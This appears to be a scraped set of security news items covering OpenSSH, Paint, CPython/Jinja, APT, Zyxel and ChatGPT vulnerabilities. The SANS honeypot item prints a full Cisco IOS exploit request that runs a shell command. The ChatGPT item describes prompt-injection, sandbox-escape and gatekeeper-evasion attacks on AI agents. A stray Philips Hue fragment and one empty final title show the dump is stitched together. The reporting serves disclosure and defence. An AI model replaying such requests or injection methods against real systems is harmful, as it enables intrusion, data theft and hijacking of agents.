articles.title: OpenSSH Rushes Patches for ‘SSHole’ Authentication Bypass
articles.context: Only some of those run Alpine, but each attempt is a single connection, so an attacker can afford to try all of them,” Detectify co-founder and principal security researcher...
articles.full_text:
OpenSSH has rolled out emergency patches for a high-severity authentication bypass that allows attackers to log in using very long passwords.

Dubbed SSHole and tracked as CVE-2026-123158 (CVSS score of 8.1), the security defect affects the OpenSSH server (sshd) on Linux distributions that use the musl libc implementation with the Pluggable Authentication Module (PAM) disabled.

A “misinterpretation of whether a string is intended to be a password hash” allows attackers to access certain accounts using any password that has between 257 and 1,024 characters.

Some accounts, such as root, should never accept a password, but in Linux distributions such as Alpine, OpenWrt, Buildroot, Yocto, and others, they do, Wakefield security researcher Özgün Kültekin says.

According to OpenSSH developer Damien Miller, the flaw is not in sshd itself, but can be exploited via sshd. Fixes were included in OpenSSH 10.6p2.

“We are making this release as fast as possible (we learned of the problem yesterday) because we have recently observed multiple cases of rapid bug rediscovery by AI agents, sometimes within hours, and so now consider long embargo periods to be a dangerous practice that primarily benefits attackers,” Miller said.

Advertisement. Scroll to continue reading.

On Thursday, Alpine Linux urged users to immediately apply the OpenSSH patches and restart sshd to replace the running daemon, or disable password logins and restart sshd.

“The attacker needs the name of an account whose password field is * (an account with no password set, which is normal for key-only accounts), and needs the machine to have at least one other account with a $5$ or $6$ password hash,” Alpine Linux warns.

Since version 3.16, Alpine Linux uses “*” to secure the root account, and $5$ or $6$ in password hashes show whether the SHA-256 or SHA-512 crypt was used.

“An attacker who can reach your SSH port can log in without knowing any password. It takes one connection, works every time, and needs no retries,” Alpine Linux notes.

Affected Alpine Linux deployments run OpenSSH without PAM, have password authentication enabled, have an account with the password field “*” (such as root, a key-only user created with adduser without a password, the alpine user in the official tiny-cloud images, or a user coming from a directory service through musl-nscd), and have at least one local account with a $5$ or $6$ password hash.

“Affected releases: every Alpine release we checked, 3.21 through 3.24 and edge, and the older releases that no longer receive regular updates (3.16 to 3.20),” Alpine Linux says.

“We haven’t seen any reports of exploitation yet, but the details are public, and the attack is simple, so I expect scanning to start within hours. Finding targets is very easy. Shodan lists around 22 million systems with SSH open on port 22, and the real number is higher because Shodan doesn’t see everything. Only some of those run Alpine, but each attempt is a single connection, so an attacker can afford to try all of them,” Detectify co-founder and principal security researcher Fredrik Almroth said.

“We’d be extremely surprised if we didn’t see SSH brute-forcers attempting this by the weekend. It’s virtually free to try and an easy win if it works. If your organization is affected, update to the latest version where possible, and disable password-based authentication as a temporary mitigation if you can’t,” WatchTowr head of threat intelligence Jake Knott said.

articles.title: Microsoft Paint RCE Fix Now Available, but Windows Update Won't Deliver It
articles.context: Attack Conditions and Exploitation Status An attacker could exploit the flaw by sending "a specially crafted packet to an affected service over the network," the advisory says,...
articles.full_text:
A fix for CVE-2026-83844, a remote code execution flaw in Windows Paint, is now in the Microsoft Store. Paint gets this fix only through a Store update, not through Windows updates.

The fixed build, 11.2609.401.0, was the newest Paint build in all ten countries The Hacker News checked today.

The flaw is an out-of-bounds read that could let an attacker run code over a network. Microsoft rates it as Important, with a CVSS score of 8.1, and says that a successful attack requires a deep understanding of the target system. The flaw was not known to be exploited or publicly disclosed when the company published it on October 13.

Brian Vitko of RFF, a device-management software maker, checked which Paint builds the Store offered in six countries earlier this week. He found that the newest in each was 11.2605.81.0, a build without the fix.

His test virtual machine has since moved to the fixed build on its own, through Store auto-update. That is one machine, and how quickly other PCs will get the build is not yet clear.

Which Build Counts as Fixed

Microsoft's security advisory names 11.2609.401.0 as the fixed build. The CVE record for the flaw, which the company also publishes, still lists Paint as affected only below 11.2605.91.0. Its NVD entry shows the same range.

So a scanner that reads the CVE record would treat any build from 11.2605.91.0 up as fixed. A copy at 11.2609.401.0 or later passes under both numbers.

As recently as last week, the advisory gave 11.2605.91.0 as the fixed build, according to a forum question on Microsoft Q&A. The advisory's revision history still shows only its October 13 entry, with no note about the change.

How to Check Every Copy of Paint

Paint, like other Store apps, is installed separately for each user account on a PC. Windows can also keep a provisioned copy that it installs for each new user. A check of only the signed-in account can miss older copies.

Vitko's test write-up gives two commands to run in a PowerShell window opened as administrator. The first lists every user's copy of Paint, and the second lists the provisioned copy.

Get-AppxPackage -AllUsers -Name Microsoft.Paint | Select-Object Version, @{ n = 'Users'; e = { $_.PackageUserInformation.UserSecurityId.Username -join ', ' } }

Get-AppxProvisionedPackage -Online | Where-Object DisplayName -eq 'Microsoft.Paint' | Select-Object Version

For any copy below 11.2609.401.0:

Update Paint through the Store, or let the Store auto-update install the fixed build. In Intune and other device-management tools, the Store app update scan does this across many PCs.

Run both commands again and check that every copy shows 11.2609.401.0 or later.

The advisory lists no workaround or mitigation. Before the fix reached the Store, Vitko suggested removing Paint where nobody needs it, for every user and from the provisioned copy. He did not test that step.

Attack Conditions and Exploitation Status

An attacker could exploit the flaw by sending "a specially crafted packet to an affected service over the network," the advisory says, but it does not name the service. The attack would require no sign-in and no user assistance.

The flaw was not in the Known Exploited Vulnerabilities catalog run by the U.S. Cybersecurity and Infrastructure Security Agency when The Hacker News checked today. The catalog was last updated earlier this week.

articles.title: CISA Adds One Known Exploited Vulnerability to Catalog
articles.context: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation
articles.full_text:
CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2026-19868 SonicWall SonicOS SSLVPN Use of Single-factor Authentication Vulnerability

This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

articles.title: CPython flaw exposes AI inference servers to sandbox escape attacks
articles.context: “By exploiting this vulnerability, attackers could gain a foothold inside servers responsible for processing millions of user requests,” Darius Houle, a security researcher at...
articles.full_text:
A memory-safety flaw in CPython can allow malicious AI model templates to escape code sandboxes and execute arbitrary code inside inference servers, according to security researchers at RunSybil.

“By exploiting this vulnerability, attackers could gain a foothold inside servers responsible for processing millions of user requests,” Darius Houle, a security researcher at RunSybil, wrote in a blog post. “They also could strike directly at the underlying cloud infrastructure hosting those workloads.”

The researchers demonstrated how a specially crafted model could exploit the flaw to bypass Jinja, a Python-based templating engine used to structure interactions between users and LLMs, sandbox protections, and execute code in the process of serving the model. The attack could expose AI hosting providers that allow customers to upload and run their own models, potentially giving attackers a foothold inside infrastructure processing requests for multiple customers, the post added.

However, the Python Security Response Team (PSRT), which handles security reports involving CPython, disputed the security implications of the demonstration in a response to CSO. “We acknowledge the underlying CPython bug reported by RunSybil and appreciate their contribution to fixing it. However, we do not consider the demonstrated sandbox escape to be a CPython security vulnerability,” the team said.

The disagreement centres on whether the interpreter should be responsible for preventing sandbox escapes. While RunSybil argues that the flaw creates risks for AI inference infrastructure, PSRT says executing untrusted Python code within a sandbox is outside CPython’s security threat model.

Exploiting Python’s type-handling mechanism

“The bug we discovered abuses CPython’s handling of generic types to accomplish a breakout,” Houle wrote. “We exploited it using objects that sandboxes make available in every template, even in empty sandbox contexts.”

The researchers found that CPython can use a cached list of parameters even after an object has been modified through a callback. When the interpreter subsequently looks for a newly introduced parameter in the original list, it can receive an invalid index. An assertion designed to catch the condition is disabled in normal release builds, allowing the interpreter to access memory outside the expected bounds.

RunSybil used this behavior to retrieve references to Python objects that the sandbox was supposed to keep inaccessible.

“While an invalid address will generally crash the interpreter, an address pointing to a useful live Python object gives our callback a reference to that object (even when the sandbox never intends to expose it),” Houle wrote.

The researchers then used the recovered object references to access Python classes and functions needed to construct executable code.

Malicious model templates enable code execution

To demonstrate the attack, RunSybil modified the Qwen2.5-0.5B-Instruct model by inserting a backdoored chat_template.jinja file. When the model was loaded and used through an inference-serving engine such as vLLM, the template enabled arbitrary code execution in the serving process.

“Breaking out of the chat template sandbox and executing code represents a supply chain risk that endangers inference providers, library developers, and model users,” Houle wrote.

The researchers said they shared proof-of-concept exploits with multiple inference providers supporting bring-your-own-model (BYOM) features, which allow customers to upload models from external sources.

Python disputes vulnerability classification

RunSybil disclosed the issue to CPython, the Pallets Project, which maintains Jinja, and Hugging Face. The researchers said they encountered conflicting views about which project should address the underlying problem.

CPython maintains that the interpreter does not support sandboxing untrusted Python code as a security boundary. In its response to CSO, the PSRT referred to the project’s security policy, which states that sandbox escapes should be addressed by the maintainers of the affected sandboxing software.

“Escapes from such sandboxes are therefore outside our security threat model and should be addressed by the maintainers of the affected sandboxing software,” the team said.

The team also disputed RunSybil’s suggestion that there was no coordinated remediation process. It said the researchers had submitted the report by email rather than through CPython’s designated private GitHub vulnerability reporting channel.

Fix backported to three Python branches

RunSybil submitted a patch to CPython, which was merged into the main development branch on Aug. 14. According to the PSRT, the fix was also backported to the 3.13, 3.14, and 3.15 branches as a regular bug fix rather than a security fix.

The distinction matters because RunSybil had raised concerns that the fix would not reach all supported Python versions.

The researchers said the absence of a backport to Python 3.12 could delay adoption of the fix across AI infrastructure deployments.

“With major portions of the AI ecosystem still solidly aligned on Python 3.12, we might not see organic adoption of our memory-safety fixes until late 2028, when it reaches its end-of-life date,” Houle wrote. The researchers recommend that AI hosting providers treat sandboxed code, template engines and expression evaluators as best-effort security controls rather than relying on them as standalone security boundaries.

articles.title: ZDI-26-897: (Pwn2Own) Home Assistant Green aiohttp_client Server-Side Request Forgery Vulnerability
articles.context: Vulnerability Details This vulnerability allows network-adjacent attackers to initiate arbitrary server-side requests on affected installations of Home Assistant Green
articles.full_text:
Vulnerability Details

This vulnerability allows network-adjacent attackers to initiate arbitrary server-side requests on affected installations of Home Assistant Green. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the aiohttp_client module. The issue results from following HTTP redirects. An attacker can leverage this in conjunction with other vulnerabilities to execute arbitrary code in the context of root.

Additional Details

Home Assistant has issued an update to correct this vulnerability. More details can be found at: https://github.com/home-assistant/core/security/advisories/GHSA-6456-4qg9-cqpj

Disclosure Timeline

2025-11-05 - Vulnerability reported to vendor

2026-11-06 - Coordinated public release of advisory

articles.title: ZDI-26-895: LibreOffice dBase File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability
articles.context: Vulnerability Details This vulnerability allows remote attackers to execute arbitrary code on affected installations of LibreOffice
articles.full_text:
Vulnerability Details

This vulnerability allows remote attackers to execute arbitrary code on affected installations of LibreOffice. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of dBase index files, which can be referenced from .odb database files. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.

Additional Details

LibreOffice has issued an update to correct this vulnerability. More details can be found at: https://www.libreoffice.org/security/#cve-2026-76181

Disclosure Timeline

2026-08-20 - Vulnerability reported to vendor

2026-11-06 - Coordinated public release of advisory

Vulnerability Details

This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of Philips Hue Bridge Pro. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the HTTP service, which listens on TCP port 443 by default. The issue results from the failure to apply a protection mechanism. An attacker can leverage this vulnerability to bypass authentication on the system.

articles.title: Researchers Bypass ChatGPT Lockdown Mode to Exfiltrate Chats Without User Interaction
articles.context: " Once the restrictions are bypassed, a threat actor can exploit the vulnerability to exfiltrate data, chat messages, or deliver malicious payloads by means of a crafted prompt,...
articles.full_text:
Cybersecurity researchers have disclosed details of a now-patched vulnerability that could be exploited to bypass Lockdown Mode protections in OpenAI ChatGPT.

Lockdown Mode was introduced by the artificial intelligence (AI) company in June 2026 as an optional setting to minimize data exfiltration risks arising from prompt injections.

"The flaw could enable silent chat data theft, phishing, and malware delivery, including zero-click data exfiltration in the ChatGPT desktop application," Eli Smadja, head of research at Check Point, said in a report shared with The Hacker News.

The problem stems from HTML page previews inside ChatGPT code blocks, which allow HTML content to be rendered directly within the application. Given that executing user-supplied HTML and JavaScript can introduce security risks of its own, the content is placed inside a sandbox so that it cannot access data from the app, such as cookies and local storage.

The sandbox also prevents the rendered content from communicating with external resources without user consent. Lockdown Mode acts as a security barrier, mitigating data exfiltration risk by limiting outbound network requests that could be used to transfer sensitive information to an attacker-controlled infrastructure.

However, Check Point found a loophole in the manner popup windows are handled during HTML previews that made it possible to escape the confines of the sandbox and bypass Lockdown Mode.

"The HTML preview used nested sandboxed frames, and while ChatGPT intercepted direct attempts to open new windows, the underlying sandbox permissions still allowed popups and permitted them to escape the sandbox," Smadja explained.

"By creating another nested frame within the rendered page, it was possible to access an unmodified popup function and bypass the restrictions placed on the original HTML preview. Content opened through this route was no longer subject to the same sandbox restrictions, providing a way to circumvent the protections of Lockdown Mode."

Once the restrictions are bypassed, a threat actor can exploit the vulnerability to exfiltrate data, chat messages, or deliver malicious payloads by means of a crafted prompt, a malicious GPT, or a shared chat.

What's more, as the attacker is in complete control of the content displayed in the popup window, it could be used to render convincing social-engineering lures, such as a fake ChatGPT update, and trick the victim into downloading malware by persuading them to click on a link.

That said, the underlying issue is not limited to the Electron-based desktop environment, highlighting how weakness outside of the scope of the AI model can undermine AI security controls. Following responsible disclosure, the vulnerability was addressed by OpenAI on September 18, 2026.

"Lockdown Mode was specifically intended to reduce the possibility of data leaving a conversation through potentially malicious outbound requests, yet a weakness in another application feature provided an alternative path around that security boundary," Smadja said.

"The finding raises a broader enterprise security issue: AI security controls are only as strong as the wider application environment around them."

The disclosure comes a week after Parameter Labs detailed a way to bypass ChatGPT's sandbox and content security policy (CSP) and take over anyone's account simply by sending an attacker-controlled public ChatGPT share link and prompting them to click the HTML preview once. If the HTML block is marked as previewable, it's opened automatically.

"An attacker could create a malicious conversation, publish it using ChatGPT's normal sharing feature, and send the link to another user," security researcher Mukul Goyal said. "When the victim opened the share, the payload executed as chatgpt[.]com with access to the victim's authenticated web session."

Earlier this September, Check Point also demonstrated a covert cross-account command channel through which an attacker could use a victim's ChatGPT session to run hidden tasks with the tools, data, and connected apps available to that session, alongside the visible conversation.

"The victim could receive a normal answer to their visible request while the attacker's task was processed separately and its result returned across accounts," Check Point said. "The channel operated through code-execution environments belonging to different ChatGPT accounts."

"The hidden instruction could be delivered through a malicious prompt, a shared ChatGPT conversation, or a custom GPT. Once it was present in the victim's conversation context, an ordinary message could trigger the attacker-controlled task without revealing it in the visible response."

The findings coincide with the discovery of a number of security shortcomings in various AI-driven tools and services over the past few months to trick them into spilling secrets or carrying out unauthorized actions -

An attack called SkillJacking that hijacks dependencies used by skills (repositories, packages, domains, or cloud apps) to compromise every agent installing them.

A set of vulnerabilities in built-in browsers associated with five AI coding assistants, Cursor, GitHub Copilot, OpenAI Codex, Microsoft Visual Studio Code, and Anthropic Claude Desktop that could be exploited to execute code on a host machine, read and steal files, or spoof web browser address bars. The issues have been codenamed Embrace, short for EMbedded BRowser - Arbitrary Code Execution, Arbitrary Content Exfiltration, and Arbitrary Context Emulation.

A technique called Repeat-After-Me that targets LangChain LangGraph, Microsoft Agent Framework, Microsoft AutoGen, Google Agent Development Kit 2.0, AWS Strands Agents, and CrewAI and tricks them into running tool calls by means of a "seemingly benign text-repetition request."

A vulnerability called AgentCorruption that could allow an attacker to interact with an exposed AI agent running on AWS Bedrock AgentCore and leverage prompt injection techniques to influence that agent and extract its IMDS credentials, and then use them to access other agents, read private conversations, steal connected-tool credentials, and manipulate agent behavior.

A vulnerability in SpaceXSI Grok and GitHub Copilot CLI called Cryptographic Context Injection that could be exploited to read a developer's local files and send them to an external server from a single web page via an indirect prompt injection, which hides malicious instructions inside AES-encrypted text.

A zero-click vulnerability called SalesBleed that could be exploited to extract sensitive account data out of Salesforce Agentforce by leveraging the Web-to-Lead form to plant an indirect prompt injection payload.

A proof-of-concept (PoC) attack called not-a-mused that allows an unprivileged local attacker (or process) to redirect Meta Muse's dictation traffic and abuse the permissions granted to the AI assistant to perform arbitrary actions.

A zero-click vulnerability called Plugin4Shell that could be exploited to conduct an AI supply chain attack by silently swapping a trusted plugin with a malicious one while bypassing SHA pinning. "The agent checks out the exact commit the marketplace pinned but never verifies it landed there, so an attacker who controls the plugin's repo makes the checkout resolve to malicious code while the pin still looks honored," Air Security said. "The result is zero-click remote code execution across Claude Code, Codex, GitHub Copilot, and Gemini CLI."

An attack called BragJack that can be exploited to hijack the AI agents built into browsers like Google Chrome, Microsoft Edge, Opera Neon, Perplexity Comet, and Anthropic Claude in Chrome by using an already installed malicious browser extension in conjunction with prompt forcing.

A behavioral effect called sampling drift demonstrates how adding an invisible watermark to a large language model's (LLM) output can unintentionally change how the model behaves, including the tools an AI agent invokes, and likely weaken safety refusals. "Watermarking changes refusal behavior on bare harmful requests, but the effect is more pronounced when the same requests are paired with the prompt-injection technique," Lasso Security said. "On several models, watermarking then makes the model more likely to answer harmful requests that it would otherwise refuse."

A set of attacks that exploit customer support AI agents to compose and send phishing emails, invoke tool calls, and bypass multi-factor authentication (MFA) protections.

A prompt-crafting technique called PuzzleMask that bypasses quick LLM-based policy checks carried out by a lightweight gatekeeper model by planting the malicious instruction in a specially crafted prose wrapper, after which the payload is processed by a more powerful target model to trigger malicious actions.

A technique called Workflow Identity Hijacking allows an attacker to bypass standard controls by sending normal, benign requests through an unauthenticated entry point, causing the enterprise AI pipeline to process the request and execute the action as designed. "The core failure is that the requester had no authority to make that request," Noma Security said. "When an AI workflow performs downstream actions, it executes using high-privilege service accounts or developer API keys rather than enforcing the permissions of the external user. As a result, AI workflows become unauthenticated proxies for privileged actions and silent data exfiltration."

A zero-click vulnerability class called PleaseFix that could be exploited to hijack AI agents embedded in agentic browsers by placing malicious instructions inside emails, calendar invitations, or web pages, and exploit a technique referred to as intent collision to cause the agent to "act on the attacker's behalf using the user's own identity, permissions and access."

A set of vulnerabilities impacting AI coding agents from Anthropic, Google, and OpenAI that could be exploited to trick them into handing over a victim's secrets, achieving persistent instruction poisoning by modifying the AGENTS.md file, and compromising software releases through prompt injections placed inside untrusted user inputs, like GitHub issues.

"Agents are becoming the default infrastructure across CI/CD, messaging, triage, incident response, and support," Novee Security said. "The more autonomous they get, the more the harness decides what's safe on your behalf, and the more untrusted input reaches real execution."

articles.title: Vulnerability Scans for Older Cisco IOS Vulnerability / Opt-Out Headers, (Thu, Nov 5th)
articles.context: Instead, I first ran into some GeoServer exploits, but found them to be too boring to write up
articles.full_text:
This morning, I was browsing our honeypot data for any new and existing PHP exploit attempts. Instead, I first ran into some GeoServer exploits, but found them to be too boring to write up. This Cisco IOS exploit attempt was a bit more interesting. Still nothing new. I suspect this is for CVE-2023-20198.

POST /%77ebui_wsma_https HTTP/1.1 Host: [redacted]:8000 User-Agent: RootEvidence/1.0 Content-Length: 720 Connection: close Content-Type: text/xml; charset=UTF-8 Opt-Out-Email: re-abuse@rootevidence.com Opt-Out-Url: https://www.rootevidence.com/scanners Accept-Encoding: gzip

<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username><wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>uname -a</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>

I highlighted the actual command (uname -a) above. But also interesting is the use of a "Opt-Out-Email" and "Opt-Out-Url" header. Rootevidence is yet another exposure/vulnerability management Platform. I couldn't find a standard that suggests them, and I think it is the first time I've seen them. Rootevidence has been using them since December last year, but this is the first time I noticed them.

Oh, and they are doing URL encoding for the "w" in the URL. I bet there are some stupid WAFs that fall for that.

-- Johannes B. Ullrich, Ph.D. , Dean of Research, SANS.edu Twitter|

articles.title: Zyxel Switch Patch Missed Flaw Behind Wave of Attacks
articles.context: A flaw in Zyxel GS1900 switch firmware has been found to survive a June security update, raising questions about whether that patch fixed the vulnerability exploited in attacks...
articles.full_text:
A flaw in Zyxel GS1900 switch firmware has been found to survive a June security update, raising questions about whether that patch fixed the vulnerability exploited in attacks on 996 switches in 48 countries.

Firmware security company Binarly detailed the finding in research published on November 3, linking it to an exploit that threat intelligence firm GreyNoise had described in September. The vulnerability now carries a new identifier, CVE-2026-107441. It is an out-of-bounds write flaw in the switches' web management program that can allow an unauthenticated attacker to run operating system (OS) commands with root privileges.

The attacks had originally been tied to CVE-2026-7273, which Zyxel fixed on June 16 and described as a stack-based buffer overflow in the same program, rated 8.8. On September 21, GreyNoise reported that an attacker had exploited that flaw against 996 Zyxel GS1900 switches in 48 countries, taking switch configurations, hashed root credentials and networking information.

The US Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-7273 to its Known Exploited Vulnerabilities (KEV) catalog the same day.

Read more on network device zero-days: Critical Cisco Catalyst SD-WAN Zero-Day Under Active Exploitation

June Fix Left Vulnerable Code in Place

Binarly analyzed an obfuscated Python exploit that matched the one GreyNoise described. On September 28, the researchers confirmed that all 10 firmware releases shipped as the June fix remained vulnerable to it.

Binarly said the June change added a check, but the check ran only after the unsafe copy had already occurred. The researchers wrote that the change "does not address the vulnerability."

The firm offered two explanations. Either the June patch, its description and its Common Vulnerability Scoring System (CVSS) score were incorrect, or the attacks used a different flaw and CISA's link to CVE-2026-7273 would be wrong.

Either way, Binarly said, all 10 releases advertised as fixes contain the vulnerable code.

Severity Disputed as Zyxel Ships New Firmware

Zyxel rates CVE-2026-107441 at 8.8 and says an attacker must be on the local network to exploit the vulnerability, while Binarly rates it 9.8 and says exploitation requires only network access to the switch's management service.

Binarly said it notified Zyxel on September 29. Zyxel confirmed the flaw on October 11, released a fix on October 22 and published its advisory on November 3.

The flaw affects ten GS1900 models. On the GS1900-8, for example, firmware 2.90(AAHH.2)C0 and earlier is affected and 2.90(AAHH.3)C0 contains the fix.

Zyxel told users to install the updates "for optimal protection." Its advisory lists the June releases among the affected versions, so switches last updated in June still need the new firmware.

articles.title: ThreatsDay: Apache OFBiz RCE, DreamHost Breach, DeFi Site Hijacks + 17 More Stories
articles.context: 5 Million Fraud Network Busted Investment Fraud Scheme Dismantled in Europe Authorities have arrested seven people allegedly involved in an investment fraud scheme that claimed...
articles.full_text:
$4.5 Million Fraud Network Busted

Investment Fraud Scheme Dismantled in Europe

Authorities have arrested seven people allegedly involved in an investment fraud scheme that claimed potential victims in more than 50 countries, according to Europol. The operation caused estimated losses of at least $4.5 million. The "crime-as-a-service" offering was run by a company from Cyprus and Israel, and allegedly provided cybercrime groups with an assortment of trading websites and fraudulent call centers tasked with tricking victims into transferring their savings. These call centers operated from Albania, Kosovo, and North Macedonia. "More than 100 servers were seized and seven suspects arrested during coordinated action on 3 November 2026," Europol said. "Authorities searched 17 locations and seized servers, other evidence and assets." Like other fraudulent investment schemes, the operation leveraged deceptive advertisements to funnel people towards fraudulent investment platforms, promising them substantial, quick returns from cryptocurrency trading and foreign currencies. Although victims were encouraged to transfer a small amount, they displayed illusory gains to push them into transferring increasingly large sums. The operators resorted to delaying tactics to block payments when they attempted to withdraw their funds. "Behind seemingly legitimate platforms, supposed brokers used fictitious profits and sustained psychological pressure to persuade victims to invest more," Europol said. "Personal data collected through this process was sold to criminal groups operating call centers. Operators then contacted potential victims with supposed investment opportunities, turning their initial interest into repeated demands for money."

articles.title: Gartner Report: The Attack Path is Closing Faster than Most Teams Can Patch
articles.context: Rapid7’s vulnerability management capabilities support this operational path by bringing attack-surface visibility, threat intelligence, business context, and attack-path...
articles.full_text:
Security teams have never lacked vulnerability data. The harder problem is deciding which issues create a credible path to business impact, then acting before that path can be used. As frontier AI makes it faster and less expensive to connect weaknesses, operational assumptions, and legitimate system behavior, that decision window is becoming even tighter.

The Gartner® report, Mythos Reprioritizes Cybersecurity Outcomes and Investments, examines what this shift means for cybersecurity priorities and investment. Rapid7 is offering complimentary access to the research, which we believe can help security leaders reassess how they prioritize exposure and infrastructure teams reassess how they plan response and recovery.

Why does AI change the vulnerability management equation?

Gartner states, “Mythos collapses the distance between theoretical weaknesses and executable attack scenarios, forcing cybersecurity to optimize for outcomes, not activity.” For leaders already managing more vulnerabilities than their teams can address, the pressure comes from the growing speed at which separate weaknesses can become a credible attack path.

The change also extends beyond one model. Gartner states, “By 2027, Mythos will be overtaken by new frontier-AI-enabled models, signaling that this moment is not about Mythos, but a new era of AI-assisted vulnerabilities and functional exploits.”

At Rapid7, we believe this requires a more attacker-aware view of exposure. A large backlog can contain thousands of issues with very different implications for the organization. Leaders need to understand which exposures are reachable, how they could be combined, which business services they affect, and what action would reduce risk most effectively.

What should security leaders measure instead?

Vulnerability counts, backlog size, and generic remediation targets show how much work a team has completed. They provide less clarity on whether an attacker’s options have narrowed or whether the organization can respond and recover more effectively.

Gartner advises, “Organizations must shift focus from volume and activity to speed of decision, effectiveness of response, and tangible reduction of enterprise risk in an environment where attacker reasoning scales rapidly.”

The report examines outcome-driven measures including “Attack path analysis coverage,” “Patching cadence,” “Compensating control deployment cadence,” “Mean time to remediate,” and “Technology debt.” We believe this gives leaders a stronger basis for connecting security investment with reduced exposure, faster action, and business resilience.

How can teams move from prioritization to action?

Better prioritization only creates value when teams can act on it. Gartner recommends, “Use attack path analysis to prioritize your patches, virtual patches, and compensating controls. This can scale down to a consideration of critical services mapped into critical business outcomes and exposure.”

Rapid7’s internal, practitioner-led exploration of Claude Mythos Preview through Project Glasswing reinforces our view that faster discovery is only the beginning. A model may help identify and validate a potential vulnerability, but reducing exposure still requires teams to understand affected systems, apply business context, choose the right remediation or compensating control, verify the result, and maintain detection coverage.

Rapid7’s vulnerability management capabilities support this operational path by bringing attack-surface visibility, threat intelligence, business context, and attack-path analysis together, helping teams identify which exposures matter most and coordinate remediation through existing workflows.

What does an outcome-led program look like?

An outcome-led program gives executives a clearer answer to a more useful question: which attacker opportunities did we reduce, and how quickly could we respond? It also supports ongoing decisions about technical debt, recovery planning, and where limited resources can deliver the greatest reduction in business risk.

Access the complimentary Gartner report, Mythos Reprioritizes Cybersecurity Outcomes and Investments, to explore how AI-assisted vulnerability discovery may change cybersecurity priorities, metrics, and investment decisions.

⠀

articles.title: Debian, Ubuntu patch APT flaw that could hand attackers root
articles.context: Linux administrators’ trust in package managers is being tested by a newly disclosed vulnerability in APT, the package management system used by Debian, Ubuntu, and their...
articles.full_text:
Linux administrators’ trust in package managers is being tested by a newly disclosed vulnerability in APT, the package management system used by Debian, Ubuntu, and their derivatives, that could allow attackers to install unverified software with root privileges.

Tracked as CVE-2026-109518, the vulnerability could let an attacker positioned to manipulate HTTP traffic between an APT client and an archive server install an attacker-controlled package without verification.

Debian disclosed the flaw on November 4, crediting security researcher Max Justicz. Ubuntu subsequently rated it High, assigning it a CVSS score of 7.7.

“I used an AI for two hours and found a zero-day that would let a nation-state hack any server running stock Ubuntu,” Justicz said in an X post. Successful exploitation could allow arbitrary code execution with root privileges on a vulnerable machine.

Both distributions have issued fixes.

Redirects and retries turn hardlinks into an attack surface

The problem lies in APT’s handling of HTTP redirects and resumed downloads.

“APT can merge two different package downloads after an HTTP redirect gives them the same URI,” Debian’s advisory said. “Improper file handling when resuming an HTTP download allows a man-in-the-middle (MitM) attacker to replace a package after verification, resulting in the execution of arbitrary code as root.”

APT developers provide a more detailed explanation: an attacker can exploit redirects and transient HTTP server errors that trigger download retries, causing APT to override existing hard links with a chosen payload. Because Debian packages are installed with root privileges, successfully substituting a package can lead to arbitrary code execution as root.

Ubuntu described the required attack position as an on-path attacker able to manipulate traffic between the package client and the archive server. A malicious mirror or proxy could provide that position, but the attack requires specific download conditions.

Retry settings decide who is exposed

The vulnerability depends on APT’s Acquire::Retries setting being non-zero. APT developers say this has been the default since version 2.3.2, although scripts may have enabled retries on older installations. Ubuntu specifies that the default retry value of three applies from Debian 12 (Bookworm) and Ubuntu 22.04 LTS (Jammy Jellyfish) onward. Older releases are not exposed by default, but may still be vulnerable if retries have been enabled.

Debian 13 (Trixie) is patched in APT 3.0.4, while Debian 12 (Bookworm) received the fix in version 2.6.2. Ubuntu has also released patched packages for supported releases, including 22.04 LTS, 24.04.LTS, and 26.04 LTS. Ubuntu 26.10 was also affected, with its fix being published when Ubuntu’s November 4 advisory appeared. The fix addresses the underlying file-handling issue. In a commit authored on October 12, APT developer Julian Andres Klode changed the download code to open destination files exclusively, unlinking existing files before copying over any partially downloaded content.

The change prevents downloads from writing through existing hard links, which could otherwise redirect writes to unintended files.

Ubuntu recommends updating APT and temporarily disabling retries during remediation. It also advises using HTTPS for package downloads, which protects against traffic manipulation in this attack scenario. For enterprise security teams, the priority is to identify vulnerable installations, check retry configurations, and ensure patched packages reach production systems and the Linux images used to provision them.

articles.title: OpenAI AI Pipeline Generates 948 Linux Root Escalation Exploits in 30-Hour Run
